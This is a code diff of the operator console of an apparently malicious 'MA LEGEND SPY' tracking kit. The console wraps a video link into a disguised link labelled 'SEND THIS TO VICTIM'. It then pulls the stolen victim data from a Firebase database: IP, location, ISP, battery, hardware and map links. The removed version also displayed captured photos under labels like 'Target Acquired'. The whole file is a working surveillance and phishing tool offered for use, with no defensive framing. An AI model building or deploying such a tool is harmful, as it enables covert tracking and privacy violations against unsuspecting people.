@@ -3,216 +3,98 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MA LEGEND | OMEGA v8.8 ELITE</title>
-    <script src="https://cdn.tailwindcss.com"></script>
+    <title>MA LEGEND | SUPREME CONTROL</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;600;700&family=Orbitron:wght@400;700&display=swap');
-        body { background: #000; color: #00ff41; font-family: 'Rajdhani', sans-serif; overflow-x: hidden; }
-        .cyber-card { background: rgba(5, 5, 5, 0.9); border: 1px solid #111; position: relative; box-shadow: 0 0 15px rgba(0,0,0,1); transition: 0.3s; }
-        .cyber-card:hover { border-color: #ff0000; box-shadow: 0 0 20px rgba(255,0,0,0.3); }
-        .neon-text { text-shadow: 0 0 10px #00ff41; }
-        .red-neon { text-shadow: 0 0 10px #ff0000; color: #ff0000; }
-        .no-scrollbar::-webkit-scrollbar { display: none; }
-        .scan-line { width: 100%; height: 2px; background: rgba(255,0,0,0.5); position: absolute; top: 0; left: 0; animation: scan 3s linear infinite; z-index: 20; pointer-events: none; }
-        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
-        .social-link { border: 1px solid #222; background: #080808; transition: 0.4s; }
-        .social-link:hover { border-color: #ff0000; transform: translateY(-3px); box-shadow: 0 5px 15px rgba(255,0,0,0.3); color: #fff; }
-        .pulse-red { animation: pulse 1.5s infinite; }
-        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Poppins:wght@400;600&display=swap');
+        body { background: #e0e5ec; font-family: 'Poppins', sans-serif; color: #44476a; display: flex; justify-content: center; padding: 20px; }
+        .container { width: 100%; max-width: 500px; }
+        .neu-card { background: #e0e5ec; padding: 25px; border-radius: 30px; box-shadow: 9px 9px 16px #bcbfc5, -9px -9px 16px #ffffff; margin-bottom: 25px; }
+        h2 { font-family: 'Orbitron'; color: #00a884; text-align: center; letter-spacing: 2px; font-size: 1.2rem; }
+        label { font-size: 0.7rem; font-weight: bold; margin-left: 10px; }
+        input { width: 100%; padding: 15px; border: none; border-radius: 15px; background: #e0e5ec; box-shadow: inset 6px 6px 12px #cbcbe1, inset -6px -6px 12px #ffffff; outline: none; margin: 10px 0; box-sizing: border-box; font-family: 'Poppins'; }
+        .btn { width: 100%; padding: 15px; border: none; border-radius: 15px; background: #e0e5ec; box-shadow: 6px 6px 12px #bcbfc5, -6px -6px 12px #ffffff; color: #00a884; font-weight: bold; cursor: pointer; font-family: 'Orbitron'; margin-top: 10px; transition: 0.3s; }
+        .btn:active { box-shadow: inset 4px 4px 8px #bcbfc5, inset -4px -4px 8px #ffffff; }
+        .log-card { background: #e0e5ec; padding: 20px; border-radius: 20px; box-shadow: 6px 6px 12px #bcbfc5, -6px -6px 12px #ffffff; margin-top: 20px; font-size: 0.75rem; border-left: 6px solid #00a884; animation: fadeIn 0.5s ease; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        .row { display: flex; justify-content: space-between; border-bottom: 1px solid rgba(0,0,0,0.05); padding: 5px 0; }
+        .row b { color: #00a884; }
     </style>
 </head>
-<body class="p-2 md:p-6 min-h-screen flex flex-col">
-
-    <!-- Top Status Bar -->
-    <div class="mb-6 grid grid-cols-2 md:grid-cols-4 gap-3">
-        <div class="cyber-card p-3 rounded border-b-2 border-b-green-600">
-            <span class="text-[9px] uppercase text-zinc-600 block">System Core</span>
-            <span class="text-sm font-bold neon-text">MA LEGEND v8.8</span>
-        </div>
-        <div class="cyber-card p-3 rounded border-b-2 border-b-red-600">
-            <span class="text-[9px] uppercase text-zinc-600 block">Total Captured</span>
-            <span id="totalCount" class="text-sm font-bold red-neon">00</span>
-        </div>
-        <div class="cyber-card p-3 rounded border-b-2 border-b-blue-600 text-blue-500">
-            <span class="text-[9px] uppercase text-zinc-600 block">Satellite Link</span>
-            <span class="text-sm font-bold">STABLE</span>
-        </div>
-        <div class="cyber-card p-3 rounded border-b-2 border-b-yellow-600 text-yellow-500">
-            <span class="text-[9px] uppercase text-zinc-600 block">Current Time</span>
-            <span id="lastPing" class="text-sm font-bold">00:00:00</span>
-        </div>
-    </div>
-
-    <!-- Main Generator -->
-    <div class="max-w-7xl mx-auto w-full mb-10">
-        <div class="cyber-card p-6 rounded-lg border-zinc-800 relative">
-            <div class="absolute top-0 right-0 p-2 text-[8px] text-red-900 font-bold italic uppercase tracking-widest">Authorized Access Only</div>
-            <h1 class="font-bold text-white mb-4 tracking-[0.2em] flex items-center gap-2">
-                <span class="w-2 h-2 bg-red-600 rounded-full pulse-red"></span>
-                DEPLOYMENT CONSOLE
-            </h1>
-            <div class="flex flex-col md:flex-row gap-3">
-                <input type="text" id="ytUrl" placeholder="Paste Video URL Here..." class="flex-1 bg-black border border-zinc-800 p-3 rounded text-zinc-300 focus:border-red-600 outline-none font-mono text-sm">
-                <button onclick="generateLink()" class="bg-red-900 hover:bg-red-700 text-white font-bold px-8 py-3 rounded transition-all uppercase tracking-widest text-sm shadow-[0_0_15px_rgba(153,0,0,0.4)]">Launch Trap</button>
-            </div>
-            <div id="outBox" class="mt-4 p-4 bg-zinc-950 rounded border border-dashed border-red-900 hidden flex items-center justify-between animate-pulse">
-                <p id="finalLink" class="text-yellow-500 font-mono text-xs truncate mr-4"></p>
-                <span class="text-[8px] text-zinc-500 font-bold">AUTO-COPIED</span>
+<body>
+    <div class="container">
+        <div class="neu-card">
+            <h2>MA LEGEND SPY</h2>
+            <p style="text-align:center; font-size:10px; opacity:0.6;">MULTI-USER PRIVACY ENABLED</p>
+            
+            <label>YOUR SECRET KEY:</label>
+            <input type="text" id="user-key" placeholder="Enter any name/key...">
+            
+            <label>TARGET VIDEO LINK:</label>
+            <input type="text" id="vid-url" placeholder="YouTube, FB, or any video link...">
+            
+            <button class="btn" onclick="generateLink()">GENERATE LINK</button>
+            
+            <div id="result-box" style="display:none; margin-top:20px;">
+                <label>SEND THIS TO VICTIM:</label>
+                <input type="text" id="final-link" readonly onclick="this.select()">
             </div>
         </div>
 
-        <!-- Feed Grid -->
-        <div class="flex justify-between items-center my-8">
-            <h2 class="text-xl font-bold text-white tracking-[0.3em] uppercase flex items-center gap-2">
-                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-red-600" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z" /></svg>
-                Active Intel
-            </h2>
-            <button onclick="clearAll()" class="text-[9px] text-zinc-700 hover:text-red-500 font-bold uppercase tracking-widest border border-zinc-900 px-3 py-1 rounded">Purge All</button>
-        </div>
-
-        <div id="feed" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 pb-24">
-            <div class="col-span-full text-center py-20 text-zinc-900 font-bold uppercase tracking-[0.5em] animate-pulse">Connecting to Mainframe...</div>
+        <div class="neu-card">
+            <button class="btn" onclick="fetchLogs()" style="color: #44476a;">REFRESH MY LOGS</button>
+            <div id="logs-container"></div>
         </div>
     </div>
 
-    <!-- Official Branding Footer -->
-    <footer class="mt-auto pt-10 pb-6 border-t border-zinc-900 text-center bg-black/50 backdrop-blur-md">
-        <p class="text-[10px] text-zinc-600 uppercase tracking-[0.5em] mb-4 font-bold">Created By</p>
-        <h2 class="text-4xl font-bold text-white tracking-[0.4em] mb-8">MA <span class="text-red-600">LEGEND</span></h2>
-        
-        <div class="flex flex-wrap justify-center gap-3 mb-10 px-4">
-            <a href="https://whatsapp.com/channel/0029VarS46O3QxRtTZO0z60x" target="_blank" class="social-link px-6 py-2 rounded text-[10px] font-bold text-green-500 uppercase tracking-widest">WhatsApp</a>
-            <a href="https://t.me/LegendMode_banchack_whatsapp" target="_blank" class="social-link px-6 py-2 rounded text-[10px] font-bold text-blue-500 uppercase tracking-widest">Telegram</a>
-            <a href="https://www.youtube.com/@legendmod407" target="_blank" class="social-link px-6 py-2 rounded text-[10px] font-bold text-red-600 uppercase tracking-widest">YouTube</a>
-        </div>
-        <p class="text-[10px] text-zinc-800 uppercase italic">Copyright © 2025 LegendMode Intelligence | For Research Purposes</p>
-    </footer>
-
-    <!-- Zoom Modal -->
-    <div id="imgModal" class="fixed inset-0 bg-black/98 z-50 hidden flex items-center justify-center p-4" onclick="this.classList.add('hidden')">
-        <img id="modalImg" src="" class="max-w-full max-h-[80vh] rounded shadow-2xl border border-red-600/50">
-        <div class="absolute bottom-10 flex gap-4">
-            <a id="dlBtn" download="target_capture.jpg" class="bg-red-700 text-white px-8 py-3 font-bold rounded uppercase text-sm shadow-lg hover:bg-red-600">Save Intelligence</a>
-        </div>
-    </div>
+    <audio id="ping" src="https://www.myinstants.com/media/sounds/notification.mp3"></audio>
 
     <script>
-        const FB_URL = "https://hgggy-a047e-default-rtdb.firebaseio.com/targets.json";
+        const FB_URL = "https://legend-tricker-default-rtdb.asia-southeast1.firebasedatabase.app/users/";
         let lastCount = 0;
 
         function generateLink() {
-            const val = document.getElementById('ytUrl').value;
-            if(!val) return;
-            const id = (val.split('v=')[1] || val.split('/').pop()).split('&')[0];
-            const final = "https://video-five-henna.vercel.app/?id=" + id;
-            document.getElementById('outBox').classList.remove('hidden');
-            document.getElementById('finalLink').innerText = final;
-            
-            // Auto Copy
-            navigator.clipboard.writeText(final);
-            const msg = new SpeechSynthesisUtterance("Link Generated and Copied");
-            window.speechSynthesis.speak(msg);
+            const key = document.getElementById('user-key').value.trim();
+            const vid = document.getElementById('vid-url').value.trim();
+            if(!key || !vid) return alert("Please fill both fields!");
+
+            const baseUrl = window.location.href.replace('admin.html', 'index.html');
+            const encoded = btoa(key + "|" + vid);
+            document.getElementById('final-link').value = baseUrl + "?id=" + encoded;
+            document.getElementById('result-box').style.display = 'block';
         }
 
-        function openImg(src) {
-            document.getElementById('modalImg').src = src;
-            document.getElementById('dlBtn').href = src;
-            document.getElementById('imgModal').classList.remove('hidden');
-        }
+        async function fetchLogs() {
+            const key = document.getElementById('user-key').value.trim();
+            if(!key) return alert("Enter your Key first!");
 
-        async function updateFeed() {
             try {
-                const res = await fetch(FB_URL);
+                const res = await fetch(`${FB_URL}${key}.json`);
                 const data = await res.json();
-                const container = document.getElementById('feed');
-                
-                if(!data) {
-                    container.innerHTML = `<div class="col-span-full text-center py-20 text-zinc-900 font-bold uppercase tracking-widest">No Signals Captured Yet</div>`;
-                    document.getElementById('totalCount').innerText = "00";
-                    return;
-                }
+                const container = document.getElementById('logs-container');
+                container.innerHTML = "";
 
-                const keys = Object.keys(data).reverse();
-                document.getElementById('totalCount').innerText = keys.length.toString().padStart(2, '0');
-                document.getElementById('lastPing').innerText = new Date().toLocaleTimeString();
+                if(!data) { container.innerHTML = "<p style='text-align:center; margin-top:10px;'>No logs yet.</p>"; return; }
 
-                if(keys.length > lastCount) {
-                    const speech = new SpeechSynthesisUtterance("Target Acquired");
-                    window.speechSynthesis.speak(speech);
-                }
-                lastCount = keys.length;
+                if(Object.keys(data).length > lastCount && lastCount !== 0) document.getElementById('ping').play();
+                lastCount = Object.keys(data).length;
 
-                let html = "";
-                keys.forEach(k => {
-                    const t = data[k];
-                    if(!t.photos) return;
-                    
-                    const isVPN = t.isp && (t.isp.toLowerCase().includes('vpn') || t.isp.toLowerCase().includes('proxy') || t.isp.toLowerCase().includes('cloud'));
-
-                    html += `
-                        <div class="cyber-card rounded-lg p-4 overflow-hidden group">
-                            <div class="scan-line"></div>
-                            <div class="flex justify-between items-center mb-3">
-                                <span class="text-red-600 font-bold text-[10px] tracking-widest italic">${t.time}</span>
-                                <button onclick="deleteTarget('${k}')" class="text-[9px] font-bold text-zinc-800 hover:text-red-500 border border-zinc-900 px-2 py-0.5 rounded uppercase">Terminate</button>
-                            </div>
-
-                            <div class="relative h-64 bg-black rounded overflow-hidden mb-4 border border-zinc-900">
-                                <div class="flex h-full overflow-x-auto no-scrollbar snap-x snap-mandatory">
-                                    ${t.photos.map(p => `<img src="${p}" onclick="openImg('${p}')" class="h-full w-full object-cover flex-shrink-0 snap-center cursor-zoom-in">`).join('')}
-                                </div>
-                                <div class="absolute top-2 right-2 bg-red-600 text-[9px] text-white px-2 py-0.5 font-bold rounded shadow-lg">DATA: ${t.photos.length}X</div>
-                                ${isVPN ? `<div class="absolute top-2 left-2 bg-white text-red-600 text-[9px] px-2 py-0.5 font-bold rounded animate-pulse">VPN ALERT</div>` : ''}
-                            </div>
-
-                            <div class="grid grid-cols-2 gap-2 text-[10px] font-mono">
-                                <div class="bg-zinc-950 p-2 rounded border border-zinc-900">
-                                    <span class="text-zinc-600 uppercase text-[8px]">Network IP</span><br>
-                                    <span class="text-white">${t.ip || '---'}</span>
-                                </div>
-                                <div class="bg-zinc-950 p-2 rounded border border-zinc-900">
-                                    <span class="text-zinc-600 uppercase text-[8px]">Location</span><br>
-                                    <span class="text-blue-500 font-bold uppercase truncate block">${t.city || 'HIDDEN'}</span>
-                                </div>
-                                <div class="col-span-2 bg-zinc-950 p-2 rounded border border-zinc-900 flex justify-between items-center">
-                                    <div><span class="text-zinc-600 uppercase text-[8px]">Power</span><br><span class="text-yellow-500">${t.battery || '---'}</span></div>
-                                    <div class="text-right"><span class="text-zinc-600 uppercase text-[8px]">Device</span><br><span class="text-zinc-400 uppercase">${t.device.ram} RAM</span></div>
-                                </div>
-                                <div class="col-span-2 bg-zinc-950 p-2 rounded border border-zinc-900">
-                                    <span class="text-zinc-600 uppercase text-[8px]">Network ISP</span><br>
-                                    <span class="text-zinc-500 truncate block text-[9px] italic">${t.isp || '---'}</span>
-                                </div>
-                            </div>
-
-                            <div class="grid grid-cols-2 gap-2 mt-4">
-                                <a href="${t.gps || '#'}" target="_blank" class="py-2.5 rounded text-center text-[9px] font-bold uppercase transition-all ${t.gps ? 'bg-blue-900 hover:bg-blue-700 text-white' : 'bg-zinc-900 text-zinc-700 pointer-events-none'}">View GPS</a>
-                                <a href="${t.map}" target="_blank" class="py-2.5 rounded text-center text-[9px] font-bold uppercase bg-red-900 hover:bg-red-700 text-white">Track IP</a>
-                            </div>
-                        </div>
-                    `;
+                Object.keys(data).reverse().forEach(id => {
+                    const l = data[id];
+                    container.innerHTML += `
+                        <div class="log-card">
+                            <div class="row"><b>🕒 Time:</b> <span>${l.time}</span></div>
+                            <div class="row"><b>📱 Device:</b> <span>${l.dev}</span></div>
+                            <div class="row"><b>🌐 IP:</b> <span>${l.ip}</span></div>
+                            <div class="row"><b>📍 Location:</b> <span>${l.loc}</span></div>
+                            <div class="row"><b>📡 ISP:</b> <span>${l.isp}</span></div>
+                            <div class="row"><b>🔋 Battery:</b> <span>${l.batt}</span></div>
+                            <div class="row"><b>🧠 Hardware:</b> <span>${l.cpu} Core | ${l.ram}GB RAM</span></div>
+                            <div class="row"><b>🖥️ GPU:</b> <span>${l.gpu}</span></div>
+                            <a href="${l.map}" target="_blank" style="display:block; text-align:center; background:#00a884; color:#fff; padding:10px; border-radius:10px; text-decoration:none; margin-top:10px; font-weight:bold;">VIEW ON MAP</a>
+                        </div>`;
                 });
-                container.innerHTML = html;
-            } catch(e) {}
+            } catch(e) { alert("Error fetching data!"); }
         }
-
-        async function deleteTarget(id) {
-            if(confirm("Confirm Elimination?")) {
-                await fetch(`https://hgggy-a047e-default-rtdb.firebaseio.com/targets/${id}.json`, { method: 'DELETE' });
-                updateFeed();
-            }
-        }
-
-        async function clearAll() {
-            if(confirm("DANGER: WIPE ENTIRE MAINFRAME?")) {
-                await fetch(FB_URL, { method: 'DELETE' });
-                updateFeed();
-            }
-        }
-
-        setInterval(updateFeed, 4000);
-        updateFeed();
     </script>
 </body>
 </html>
-
-
